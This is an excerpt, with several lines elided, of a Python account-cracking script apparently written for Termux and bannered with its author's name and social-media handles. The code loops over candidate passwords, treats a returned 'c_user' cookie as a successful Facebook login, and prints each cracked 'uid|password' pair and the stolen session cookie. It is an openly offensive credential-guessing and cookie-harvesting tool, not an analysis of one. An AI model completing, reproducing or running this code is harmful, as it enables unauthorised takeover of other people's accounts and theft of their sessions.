...
\033[1;32m[-] AUTHOR    :\033[1;32m 𝐓𝐚𝐧𝐳𝐢𝐝 𝐚𝐡𝐦𝐞𝐝 
\033[1;32m[-] GITHUB    :\033[1;32m 𝐓𝐞𝐫𝐦𝐮𝐱-𝐭𝐚𝐧𝐳𝐢𝐝
\033[1;32m[-] FACEBOOK  :\033[1;32m 𝐓𝐀𝐍𝐗𝐈𝐃
\033[1;92m══════════════════════════════════════════
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[TANZID-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {cooking}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[tanzid-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
